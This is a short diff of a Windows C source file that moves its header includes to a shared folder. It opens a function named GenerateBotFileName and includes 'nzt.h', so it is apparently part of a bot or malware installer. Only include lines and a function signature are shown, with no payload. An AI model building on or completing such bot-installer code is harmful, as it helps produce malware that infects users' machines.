@@ -1,14 +1,14 @@
 #include <Windows.h>
 
 #include "install.h"
-#include "nzt.h"
-#include "crt.h"
-#include "utils.h"
-#include "config.h"
-#include "strings.h"
+#include "..\Shared\nzt.h"
+#include "..\Shared\crt.h"
+#include "..\Shared\utils.h"
+#include "..\Shared\config.h"
+#include "..\Shared\strings.h"
 #include "globals.h"
-#include "file.h"
-#include "registry.h"
+#include "..\Shared\file.h"
+#include "..\Shared\registry.h"
 
 static DWORD GenerateBotFileName(PDWORD Seed)
 {
